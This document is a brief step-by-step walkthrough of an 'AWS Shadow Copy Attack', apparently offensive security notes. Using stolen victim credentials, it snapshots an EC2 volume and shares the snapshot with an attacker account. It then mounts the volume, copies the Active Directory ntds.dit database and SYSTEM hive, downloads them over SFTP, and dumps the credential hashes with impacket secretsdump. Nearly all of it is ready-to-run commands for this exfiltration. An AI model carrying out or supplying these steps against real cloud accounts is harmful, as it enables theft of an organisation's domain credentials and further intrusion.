# AWS - Shadow Copy Attack

## Requirements:

#### 1) EC2:CreateSnapshot

#### 2) CloudCopy - https://github.com/Static-Flow/CloudCopy

## Steps:

### 1) Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions

### 2) Run "Describe-Instances" and show in list for attacker to select

### 3) Run "Create-Snapshot" on volume of selected instance

### 4) Run "modify-snapshot-attribute" on new snapshot to set "createVolumePermission" to attacker AWS Account

### 5) Load AWS CLI with Attacker Credentials

### 6) Run "run-instance" command to create new linux ec2 with our stolen snapshot

### 7) SSH Run

    sudo mkdir /windows

### 8) SSH run 

    sudo mount /dev/xvdf1 /windows/

### 9) SSH run 

    sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user

### 10) SSH run 

    sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user

### 11) SSH run 

    sudo chown ec2-user:ec2-user /home/ec2-user/*

### 12) SFTP 

    get "/home/ec2-user/SYSTEM ./SYSTEM"

### 13) SFTP 

    get "/home/ec2-user/ntds.dit ./ntds.dit"

### 14) locally run 

    impacket-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets
    
### Expects secretsdump to be on path
